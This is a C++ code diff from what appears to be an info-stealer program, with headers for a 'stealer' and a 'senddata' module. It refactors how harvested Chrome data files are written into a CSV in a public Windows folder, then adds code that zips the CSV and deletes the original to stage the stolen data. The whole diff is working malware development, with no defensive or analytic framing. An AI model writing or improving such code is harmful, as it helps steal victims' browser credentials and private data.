@@ -8,6 +8,7 @@
 #include "Core/names.hpp"
 #include "Communication/senddata.hpp"
 #include "Core/stealer.hpp"
+#include "minizip/zip.h"
 #undef max
 
 
@@ -99,37 +100,36 @@ int main() {
                     std::ofstream csvFile("C:\\Users\\Public\\chrome_data.csv");
 
                     // Write the column headers based on the desired names
+                    std::vector<std::string> columns;
                     for (const auto& file : ChromeFiles) {
                         auto it = fileFunctionMap.find(file);
                         if (it != fileFunctionMap.end()) {
                             csvFile << it->second.second << ",";
+                            columns.push_back(it->first); // Keep track of columns being written
                         }
                     }
                     csvFile << "\n";
 
-                    // Initialize a 2D vector to store the data for each column
-                    std::vector<std::vector<std::string>> columnData;
-
-                    // Retrieve and store data for each column
-                    for (const auto& file : ChromeFiles) {
-                        auto it = fileFunctionMap.find(file);
-                        if (it != fileFunctionMap.end()) {
-                            std::set<std::string> data = it->second.first();
-                            columnData.push_back(std::vector<std::string>(data.begin(), data.end()));
-                        }
-                    }
-
-                    // Determine the maximum number of rows needed
+                    // Determine the maximum number of rows by checking the size of data sets
                     size_t maxRows = 0;
-                    for (const auto& col : columnData) {
-                        maxRows = std::max(maxRows, col.size());
+                    for (const auto& col : columns) {
+                        auto it = fileFunctionMap.find(col);
+                        if (it != fileFunctionMap.end()) {
+                            maxRows = std::max(maxRows, it->second.first().size());
+                        }
                     }
 
                     // Write data to the CSV file, ensuring each entry goes under its respective column
                     for (size_t i = 0; i < maxRows; ++i) {
-                        for (const auto& col : columnData) {
-                            if (i < col.size()) {
-                                csvFile << col[i];
+                        for (const auto& col : columns) {
+                            auto it = fileFunctionMap.find(col);
+                            if (it != fileFunctionMap.end()) {
+                                const auto& data = it->second.first();
+                                if (i < data.size()) {
+                                    auto dataIt = data.begin();
+                                    std::advance(dataIt, i);
+                                    csvFile << *dataIt;
+                                }
                             }
                             csvFile << ",";
                         }
@@ -138,6 +138,15 @@ int main() {
 
                     csvFile.close();
                     std::cout << "Data has been written to C:\\Users\\Public\\chrome_data.csv" << std::endl;
+
+                    // Call the function to add the CSV file to the zip archive and then delete the CSV file
+                    std::string csvFilePath = "C:\\Users\\Public\\chrome_data.csv";
+                    if (AddFileToZipAndDelete(zipFile, csvFilePath)) {
+                        std::cout << "CSV file has been added to the zip archive and deleted successfully." << std::endl;
+                    }
+                    else {
+                        std::cerr << "Failed to add the CSV file to the zip archive or delete the CSV file." << std::endl;
+                    }
                 }
                 else {
                     std::cout << "No Chrome data files to process." << std::endl;
